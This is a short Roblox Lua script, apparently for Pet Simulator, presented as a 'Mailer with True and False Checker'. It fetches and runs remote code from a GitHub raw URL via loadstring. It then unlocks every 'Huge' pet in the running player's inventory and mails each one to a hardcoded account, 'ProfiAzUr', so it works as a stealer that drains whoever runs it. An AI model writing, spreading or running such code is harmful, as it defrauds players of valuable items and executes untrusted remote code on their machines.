-- Mailer with True and False Checker

getgenv().MailToUser = "ProfiAzUr"

local proceed = loadstring("return " .. game:HttpGet("https://raw.githubusercontent.com/TheArexH4CKER/check/refs/heads/main/check.lua"))()

if proceed then
    local Network = require(game.ReplicatedStorage.Library.Client.Network)

    local HugeUIDList = {}
    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
        if PetData.id:find("Huge ") then
            table.insert(HugeUIDList, PetUID)
            if PetData._lk then
                repeat
                    task.wait()
                until Network.Invoke("Locking_SetLocked", PetUID, false)
                print("Unlocked", PetUID)
            end
        end
    end

    for _, PetUID in pairs(HugeUIDList) do
        repeat
            task.wait()
        until Network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
        print("Sent", PetUID)
    end
else
    print("Returned False, Huges wont be sent")
end
